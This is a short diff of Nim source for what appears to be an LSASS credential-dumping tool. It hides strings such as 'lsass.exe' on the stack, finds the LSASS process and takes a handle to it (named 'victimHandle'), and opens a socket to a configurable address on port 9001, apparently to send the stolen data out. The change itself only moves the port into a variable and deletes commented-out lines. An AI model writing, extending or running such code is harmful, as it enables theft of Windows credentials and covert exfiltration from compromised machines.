@@ -56,6 +56,7 @@ proc main() {.exportc: "Main".} =
     tmpFileName {.stackStringA.} = "twin.txt"
     sLsass {.stackStringA.} = "lsass.exe"
     sUrl {.stackStringA.} = "0.0.0.0"
+    port: uint16 = 9001
     
   discard init(ninst)
 
@@ -141,8 +142,6 @@ proc main() {.exportc: "Main".} =
     PRINTA(ninst.addr, "\n[!] Process Name: %s\n".cstring, pPathFindFileNameA(procName))
     bufSize = MAX_PATH
     
-    #if plstrcmpiA(cstrLsass, pPathFindFileNameA(procName)) == 0:
-    #if cmpIgnoreCase(cast[cstring](sLsass[0].addr), cast[cstring](pPathFindFileNameA(procName))) == 0:
     if cmpIgnoreCase(CPTR(sLsass), cast[cstring](pPathFindFileNameA(procName))) == 0:
       pid = pGetProcessId(victimHandle)
       PRINTA(ninst.addr, cast[cstring]("\n[+] Found PID %i and Obtained Handle 0x%i\n"), pid, victimHandle)
@@ -209,7 +208,7 @@ proc main() {.exportc: "Main".} =
   sa.sin_family = AF_INET
   #sa.sinaddr.S_addr = pinet_addr(sUrl[0].addr)
   sa.sinaddr.S_addr = pinet_addr(CPTR(sUrl))
-  sa.sin_port = phtons(9001)
+  sa.sin_port = phtons(port)
 
   discard pconnect(socket, cast[ptr sockaddr](sa.addr), cast[int32](sizeof(sa)))
 
